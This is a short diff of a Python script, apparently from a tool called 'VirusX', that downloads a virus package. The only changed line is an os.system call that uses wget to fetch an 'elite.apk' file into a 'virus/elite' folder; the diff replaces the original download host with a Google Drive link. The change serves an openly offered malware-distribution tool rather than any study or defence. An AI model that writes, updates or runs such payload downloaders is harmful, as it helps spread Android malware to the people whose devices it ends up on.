@@ -46,7 +46,7 @@ def main():
 			print
 			print ""+B+"[*] "+N+"Downloading..."
 			time.sleep(1)
-			os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
+			os.system("cd virus;mkdir elite;cd elite;wget https://drive.google.com/file/d/1-4V9DBYIx89INh77J1Pg4bXG34OQrYZo/view?usp=drivesdk")
 			print
 			print "Now check folder Virus on "+R+"/VirusX/virus/elite/"+N+""
 			print ""+B+"[*]"+N+"Finished"
